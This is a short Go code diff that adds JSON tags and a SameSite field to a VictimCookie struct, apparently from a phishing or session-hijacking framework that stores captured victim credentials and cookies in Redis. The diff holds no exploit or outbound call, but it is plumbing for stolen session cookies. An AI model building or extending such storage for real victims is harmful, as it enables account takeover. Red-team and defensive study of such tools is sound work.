@@ -35,14 +35,16 @@ type VictimCredential struct {
 // KEY scheme:
 // victim:<ID>:cookiejar:<COOKIE_NAME>
 type VictimCookie struct {
-	Name     string `redis:"name"`
-	Value    string `redis:"value"`
-	Domain   string `redis:"domain"`
-	Expires  string `redis:"expires"`
-	Path     string `redis:"path"`
-	HTTPOnly bool   `redis:"httpOnly"`
-	Secure   bool   `redis:"secure"`
-	Session  bool   `redis:"session"` // is the cookie a session cookie?
+	Name     string `redis:"name" json:"name"`
+	Value    string `redis:"value" json:"value"`
+	Domain   string `redis:"domain" json:"domain"`
+	Expires  string `redis:"expires" json:"expirationDate"`
+	Path     string `redis:"path" json:"path"`
+	HTTPOnly bool   `redis:"httpOnly" json:"httpOnly"`
+	Secure   bool   `redis:"secure" json:"secure"`
+	SameSite string `redis:"sameSite" json:"sameSite"`
+	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
+
 }
 
 func StoreVictim(id string, victim *Victim) error {
